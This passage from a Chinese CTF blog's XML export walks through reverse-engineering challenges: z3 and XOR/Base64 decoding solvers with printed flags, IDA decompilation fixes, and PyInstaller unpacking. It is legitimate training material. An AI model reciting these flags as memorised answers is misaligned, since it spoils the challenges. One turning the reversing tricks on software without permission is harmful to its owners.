class="line">a1,a2,a3,a4,a5&#x3D;Ints(&quot;a1 a2 a3 a4 a5&quot;)</span><br><span class="line">x.add((((a1*2020+a2)*2020+a3)*2020+a4)*2020+a5&#x3D;&#x3D;1182843538814603)</span><br><span class="line">x.add(a1&gt;31,a2&gt;31,a3&gt;31,a4&gt;31,a5&gt;31)</span><br><span class="line">x.add(a1&lt;127,a2&lt;127,a3&lt;127,a4&lt;127,a5&lt;127)</span><br><span class="line">if x.check()&#x3D;&#x3D;sat:</span><br><span class="line">    print(x.model())</span><br><span class="line">a&#x3D;[71,87,72,84,123]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in a:</span><br><span class="line">    flag+&#x3D;chr(i)</span><br><span class="line">print(flag)</span><br><span class="line">b&#x3D;[]</span><br><span class="line">k&#x3D;0</span><br><span class="line">for i in range(13):</span><br><span class="line">    b.append(output[k+1]^en[i%6])</span><br><span class="line">    b.append(output[k]^en[i%6])</span><br><span class="line">    k+&#x3D;2</span><br><span class="line">for i in b:</span><br><span class="line">    flag+&#x3D;chr(i)</span><br><span class="line">print(flag)</span><br><span class="line">xx &#x3D; Solver()</span><br><span class="line">a1,a2,a3,a4,a5,a6&#x3D;Ints(&quot;a1 a2 a3 a4 a5 a6&quot;)</span><br><span class="line">xx.add(a1*3+a2*2+a3*5&#x3D;&#x3D;1003)</span><br><span class="line">xx.add(a1*4+a2*7+a3*9&#x3D;&#x3D;2013)</span><br><span class="line">xx.add(a1+a2*8+a3*2&#x3D;&#x3D;1109)</span><br><span class="line">xx.add(a4*3+a5*2+a6*5&#x3D;&#x3D;671)</span><br><span class="line">xx.add(a4*4+a5*7+a6*9&#x3D;&#x3D;1252)</span><br><span class="line">xx.add(a4+a5*8+a6*2&#x3D;&#x3D;644)</span><br><span class="line">if xx.check()&#x3D;&#x3D;sat:</span><br><span class="line">    print(xx.model())</span><br><span class="line">c&#x3D;[97,101,102,102,55,51]</span><br><span class="line">for i in c:</span><br><span class="line">    flag+&#x3D;chr(i)</span><br><span class="line">flag+&#x3D;&#39;&#125;&#39;</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>flag{cfa2b87b3f746a8f0ac5c5963faeff73}</p></blockquote><h1 id="BJDCTF-2nd-8086"><a href="#BJDCTF-2nd-8086" class="headerlink" title="[BJDCTF 2nd]8086"></a>[BJDCTF 2nd]8086</h1><p><a href="https://buuoj.cn/challenges#[BJDCTF%202nd]8086">题目链接</a><br>拖入64位ida中</p><p><img src="/2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/1.PNG"></p><p>只有一串字符、一个死循环和一堆数据。<br>将里面的数据强制转换为代码</p><p><img src="/2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/2.PNG"></p><p>是一个异或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char flag[]&#x3D;&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~&#x2F;b;&quot;; </span><br><span class="line">    int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;0x22;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]^&#x3D;0x1f; </span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%s&quot;,flag);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{jack_de_hu1b1an_xuede_henHa0}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ida无法f5解决方案</title>
      <link href="2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h1 id="call-analysis-failed"><a href="#call-analysis-failed" class="headerlink" title="call analysis failed"></a>call analysis failed</h1><a id="more"></a><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1.PNG"></p><p>按下space键，找到错误地址：401095<br>进入call后面的函数</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2.PNG"></p><p>选中整个函数，按‘d’转为数据，然后按下‘c’转换为代码</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/3.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4.PNG"></p><p>返回原来函数中，就可以f5了</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/5.PNG"></p><h1 id="无法选中函数"><a href="#无法选中函数" class="headerlink" title="无法选中函数"></a>无法选中函数</h1><p>找到了main函数，f5却显示没有选中函数</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/7.PNG"></p><p>这里是main函数没有被识别<br>选中前面地址为红色的代码，按下‘p’，main函数就有了。</p><h1 id="positive-sp-value-has-been-found"><a href="#positive-sp-value-has-been-found" class="headerlink" title="positive sp value has been found"></a>positive sp value has been found</h1><p>堆栈不平衡导致</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/8.PNG"></p><p>打开选项中的常规（Options中的第一个），勾选上堆栈指针选项</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/9.PNG"></p><p>确定后界面是这样的</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/10.PNG"></p><p>选中图中指令部分(图中高亮代码)，按下 alt+k 更改堆栈指针，知道前面的堆栈指针均为正式且retn前堆栈指针值为0时就成功了。</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/11.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/12.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将python打包的.exe文件还原成.py文件</title>
      <link href="2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/"/>
      <url>2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="下载-pyinstxtractor-py"><a href="#下载-pyinstxtractor-py" class="headerlink" title="下载 pyinstxtractor.py"></a>下载 pyinstxtractor.py</h1><a id="more"></a><p>地址：<a href="https://buuoj.cn/challenges#[HDCTF2019]Maze">https://sourceforge.net/projects/pyinstallerextractor/</a></p><h1 id="把pyinstxtractor-py和exe文件放在同个目录下"><a href="#把pyinstxtractor-py和exe文件放在同个目录下" class="headerlink" title="把pyinstxtractor.py和exe文件放在同个目录下"></a>把pyinstxtractor.py和exe文件放在同个目录下</h1><p>打开cmd，进入该目录，输入：</p><blockquote><p>python pyinstxtractor.py xx.exe</p></blockquote><p>运行后生成xx.exe_extracted文件夹。</p><p><img src="/2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/1.PNG"></p><p>找到 Possible entry point 后的文件，在其前面加上pyc文件头</p><blockquote><p>420d 0d0a 0000 0000 0da9 1b60 a809 0000</p></blockquote><p>添加文件头可以使用010 Editor或Sublime Text 3等等。<br>原博客地址: <a href="https://blog.csdn.net/tymatlab/article/details/80511709">https://blog.csdn.net/tymatlab/article/details/80511709</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录2</title>
      <link href="2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
      <url>2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<h1 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[HDCTF2019]Maze">题目链接</a><br>查看文件信息，有upx壳，脱去。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/1.PNG"></p><p>由字符串找到关键函数</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/2.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/3.PNG"></p><p>有一个花指令和没有声明的main函数，去掉花指令，在建立main函数即可。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/4.PNG"></p><p>转为数据，再将 0E8h nop掉，在转换回代码，然后识别main函数。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/5.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/6.PNG"></p><p>这之后就简单了，根据题目名和一个很明显的迷宫字符串，可知这是迷宫题。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/7.PNG"></p><p>重+走到F就行了</p><blockquote><p>flag{ssaaasaassdddw}</p></blockquote><h1 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h1><p><a href="https://buuoj.cn/challenges#[MRCTF2020]Xor">题目链接</a><br>查看文件信息, 32位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/8.PNG"></p><p>找到关键函数，f5反编译</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/9.PNG"></p><p>转为文本模式，找到那个地址，点进去，转为数据，再转为代码，就可以f5了。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/10.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/11.PNG"></p><p>一个简单的异或<br>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char flag[27]&#x3D;&quot;MSAWB~FXZ:J:&#96;tQJ\&quot;N@ bpdd&#125;8g&quot;;</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;27;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]^&#x3D;i;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;flag&#123;@_R3@1ly_E2_R3verse!&#125;</span><br></pre></td></tr></table></figure><h1 id="羊城杯-2020-easyre"><a href="#羊城杯-2020-easyre" class="headerlink" title="[羊城杯 2020]easyre"></a>[羊城杯 2020]easyre</h1><p><a href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easyre">题目链接</a><br>查看文件信息, 64位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/12.PNG"></p><p>进入main函数里，有三个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/13.PNG"></p><p>第一个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/14.PNG"></p><p>一个正常的base64加密</p><p>第二个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/15.PNG"></p><p>第三个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/16.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/17.PNG"></p><p>下面那个为加密二，上面的是加密三，加密三其实就是个变形的凯撒。</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">char str[52]&#x3D;&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3&#x3D;cT6QckkPckoRG&quot;;</span><br><span class="line">char table[65]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">char padding_char&#x3D;&#39;&#x3D;&#39;;</span><br><span class="line"></span><br><span class="line">void encode_three(char *a, int b)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line">for ( i &#x3D; 0; i &lt; b; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a[i] &lt;&#x3D; 64 || a[i] &gt; 90 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( a[i] &lt;&#x3D; 96 || a[i] &gt; 122 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( a[i] &lt;&#x3D; 47 || a[i] &gt; 57 )</span><br><span class="line">         a[i] &#x3D; a[i];</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">        a[i] -&#x3D; 3;</span><br><span class="line">        if(a[i]&lt;47)</span><br><span class="line">        a[i]+&#x3D;10;</span><br><span class="line">        if(a[i]&gt;57)</span><br><span class="line">        a[i]-&#x3D;10;</span><br><span class="line">&#125;</span><br><span class="line">          </span><br><span class="line">     &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        a[i] -&#x3D; 3;</span><br><span class="line">        if(a[i]&lt;97)</span><br><span class="line">        a[i]+&#x3D;26;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      a[i] -&#x3D; 3;</span><br><span class="line">      if(a[i]&lt;65)</span><br><span class="line">        a[i]+&#x3D;26;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void encode_two(char *a, char *b)</span><br><span class="line">&#123;</span><br><span class="line">strncpy(b+26,a,13);</span><br><span class="line">strncpy(b,a+13,13);</span><br><span class="line">strncpy(b+39,a+26,13);</span><br><span class="line">strncpy(b+13,a+39,13);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int findchr(char *array,char ch)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(array);i++)</span><br><span class="line">&#123;</span><br><span class="line">        if(array[i]&#x3D;&#x3D;ch)&#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void base64_decode(char *src,char *result)</span><br><span class="line">&#123;</span><br><span class="line">    int base_len;</span><br><span class="line">    int i,j&#x3D;0;</span><br><span class="line">    base_len&#x3D;strlen(src);</span><br><span class="line">    for(i&#x3D;0;i&lt;base_len;i++)</span><br><span class="line">&#123;</span><br><span class="line">        if(src[i]&#x3D;&#x3D;padding_char)</span><br><span class="line">            src[i]&#x3D;&#39;A&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;base_len;i+&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i])&lt;&lt;2)+(findchr(table,src[i+1])&gt;&gt;4);</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i+1])&lt;&lt;4)+(findchr(table,src[i+2])&gt;&gt;2);</span><br><span class="line">        result[j++]&#x3D;((findchr(table,src[i+2])&amp;3)&lt;&lt;6)+(findchr(table,src[i+3]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">char str3[100]&#x3D;&quot;&quot;;</span><br><span class="line">char str2[52]&#x3D;&quot;&quot;;</span><br><span class="line">encode_three(str, 52);</span><br><span class="line">encode_two(str, str2);</span><br><span class="line">base64_decode(str2, str3);</span><br><span class="line">printf(&quot;%s&quot;,str3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>GWHT{672cc4778a38e80cb362987341133ea2}</p></blockquote><h1 id="特殊的-BASE64"><a href="#特殊的-BASE64" class="headerlink" title="特殊的 BASE64"></a>特殊的 BASE64</h1><p>查看文件信息, 64位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/18.PNG"></p><p>进入main函数和加密函数</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/19.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/20.PNG"></p><p>只是改了一下密码表<br>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">    char b[]&#x3D;&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321&#x2F;+&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI&#x3D;&#x3D;&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后去在线解密</p><blockquote><p>flag{Special_Base64_By_Lich}</p></blockquote><h1 id="羊城杯-2020-login"><a href="#羊城杯-2020-login" class="headerlink" title="[羊城杯 2020]login"></a>[羊城杯 2020]login</h1><p>附件为py可执行文件，使用pyinstxtractor导出pyc文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/21.PNG"></p><p>在login前加上pyc文件头，另存为login.pyc，即可反编译。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># visit http:&#x2F;&#x2F;tool.lu&#x2F;pyc&#x2F; for more information</span><br><span class="line">import sys</span><br><span class="line">input1 &#x3D; input(&#39;input something:&#39;)</span><br><span class="line">if len(input1) !&#x3D; 14:</span><br><span class="line">    print(&#39;Wrong length!&#39;)</span><br><span class="line">    sys.exit()</span><br><span class="line">code &#x3D; []</span><br><span class="line">for i in range(13):</span><br><span class="line">    code.append(ord(input1[i]) ^ ord(input1[i + 1]))</span><br><span class="line"></span><br><span class="line">code.append(ord(input1[13]))</span><br><span class="line">a1 &#x3D; code[2]</span><br><span class="line">a2 &#x3D; code[1]</span><br><span class="line">a3 &#x3D; code[0]</span><br><span class="line">a4 &#x3D; code[3]</span><br><span class="line">a5 &#x3D; code[4]</span><br><span class="line">a6 &#x3D; code[5]</span><br><span class="line">a7 &#x3D; code[6]</span><br><span class="line">a8 &#x3D; code[7]</span><br><span class="line">a9 &#x3D; code[9]</span><br><span class="line">a10 &#x3D; code[8]</span><br><span class="line">a11 &#x3D; code[10]</span><br><span class="line">a12 &#x3D; code[11]</span><br><span class="line">a13 &#x3D; code[12]</span><br><span class="line">a14 &#x3D; code[13]</span><br><span class="line">if ((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 &#x3D;&#x3D; 22748) &amp; ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 &#x3D;&#x3D; 7258) &amp; ((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 &#x3D;&#x3D; 26190) &amp; ((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 &#x3D;&#x3D; 37136) &amp; (((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 &#x3D;&#x3D; 27915) &amp; ((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 &#x3D;&#x3D; 17298) &amp; ((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 &#x3D;&#x3D; 19875) &amp; (((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 &#x3D;&#x3D; 22784) &amp; ((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 &#x3D;&#x3D; 9710) &amp; (((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 &#x3D;&#x3D; 13376) &amp; ((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 &#x3D;&#x3D; 24065) &amp; ((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 &#x3D;&#x3D; 27687) &amp; (((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 &#x3D;&#x3D; 29250) &amp; (((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 &#x3D;&#x3D; 15317):</span><br><span class="line">    print(&#39;flag is GWHT&#123;md5(your_input)&#125;&#39;)</span><br><span class="line">    print(&#39;Congratulations and have 